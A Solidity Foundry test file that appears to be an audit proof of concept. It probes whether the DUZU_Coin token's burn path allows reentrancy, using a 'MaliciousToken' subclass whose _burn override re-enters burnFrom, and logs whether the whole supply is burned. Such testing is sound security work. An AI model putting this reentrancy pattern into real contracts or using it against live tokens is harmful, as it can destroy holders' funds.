// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "../src/DUZU_Coin.sol";

contract MaliciousToken is DUZU_Coin {
    bool public reentered;
    
    constructor(
        address __DUZU_target,
        string memory __DUZU_name,
        string memory __DUZU_symbol,
        uint8 __DUZU_decimals,
        uint256 __DUZU_initial
    ) 
        payable 
        DUZU_Coin(__DUZU_target, __DUZU_name, __DUZU_symbol, __DUZU_decimals, __DUZU_initial) 
    {}

    function _burn(address account, uint256 amount) internal override {
        if (!reentered) {
            reentered = true;
            // Execute reentrant call to burnFrom on the same account
            this.burnFrom(account, amount);
            // Complete the initial burn after reentrancy
            super._burn(account, amount);
            reentered = false;
        } else {
            super._burn(account, amount);
        }
    }
}

contract DUZU_ReentrancyTest is Test {
    MaliciousToken token;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    uint8 constant DECIMALS = 18;
    uint256 constant INITIAL_SUPPLY = 200 * (10 ** DECIMALS);

    function setUp() public {
        vm.deal(deployer, 1 ether);
        vm.startPrank(deployer);
        // Deploy the malicious token with initial supply
        token = new MaliciousToken{value: 0}(
            /*__DUZU_target=*/ address(0), 
            /*__DUZU_name=*/ "MaliciousToken",
            /*__DUZU_symbol=*/ "MTK",
            /*__DUZU_decimals=*/ DECIMALS,
            /*__DUZU_initial=*/ INITIAL_SUPPLY
        );
        // Transfer initial tokens to attacker
        token.transfer(attacker, INITIAL_SUPPLY);
        vm.stopPrank();

        // Approve token contract to burn attacker's tokens
        vm.prank(attacker);
        token.approve(address(token), type(uint256).max);
    }

    function testReentrancyBurn() public {
        console.log("--- BEFORE-Trigger Burn ---");
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        uint256 totalSupplyBefore = token.totalSupply();
        console.log("Attacker balance before: ", attackerBalanceBefore);
        console.log("Total supply before: ", totalSupplyBefore);

        console.log("--- Trigger Burn ---");
        // Attacker triggers reentrant burn
        vm.prank(attacker);
        token.burn(INITIAL_SUPPLY / 2); // 100 tokens

        console.log("--- AFTER-Trigger Burn ---");
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        uint256 totalSupplyAfter = token.totalSupply();
        console.log("Attacker balance after: ", attackerBalanceAfter);
        console.log("Total supply after: ", totalSupplyAfter);

        uint256 burnedAmount = attackerBalanceBefore - attackerBalanceAfter;
        uint256 burnedFromSupply = totalSupplyBefore - totalSupplyAfter;
        console.log("Burned amount (attacker): ", burnedAmount);
        console.log("Burned amount (supply): ", burnedFromSupply);

        // Check if entire supply burned (INITIAL_SUPPLY) to confirm reentrancy
        if (burnedAmount == INITIAL_SUPPLY && burnedFromSupply == INITIAL_SUPPLY) {
            console.log("Vulnerability Exists: Reentrancy caused entire supply to be burned.");
        } else {
            console.log("Vulnerability not Exist: Burned amount is within expected limits.");
        }
    }
}